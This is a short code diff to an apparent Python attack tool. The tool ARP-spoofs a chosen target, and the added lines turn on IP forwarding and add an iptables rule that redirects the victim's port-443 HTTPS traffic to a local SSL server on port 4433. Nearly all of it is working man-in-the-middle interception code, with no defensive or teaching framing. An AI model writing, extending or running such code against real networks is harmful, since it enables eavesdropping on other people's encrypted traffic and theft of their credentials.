@@ -4,6 +4,7 @@ import netifaces as ni
 from threading import Thread
 import time
 import argparse
+import subprocess
 
 
 if __name__ == "__main__":
@@ -16,8 +17,12 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     try:
+        subprocess.run('echo "1" > /proc/sys/net/ipv4/ip_forward', shell=True)
+        subprocess.run('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 4433', shell=True)
+
         spoof.arpspoof(args.target, args.interface)
         host_ip = ni.ifaddresses(args.interface)[2][0]['addr']
+
         ssl_server.start_server(host_ip)
         while 1:
             time.sleep(1)
